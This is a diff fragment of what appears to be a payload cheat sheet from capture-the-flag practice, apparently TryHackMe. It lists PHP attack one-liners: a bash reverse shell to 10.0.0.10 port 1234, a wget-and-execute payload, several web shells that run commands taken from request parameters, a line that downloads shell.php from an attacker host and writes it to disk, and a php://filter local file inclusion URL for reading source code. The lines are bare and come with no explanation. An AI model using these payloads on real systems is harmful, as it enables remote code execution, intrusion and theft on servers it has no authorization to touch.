@@ -4,3 +4,8 @@
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
 <?php system("wget http://ip/file -o /tmp/file.php; php /tmp/file.php"); ?>
 <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
+<?PHP system($_REQUEST['cmd']); ?>
+<?PHP echo "Hello THM"; ?>
+
+<?php file_put_contents('shell.php', file_get_contents('http://[your-host]/shell.php'))?>
+http://10.10.208.6/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
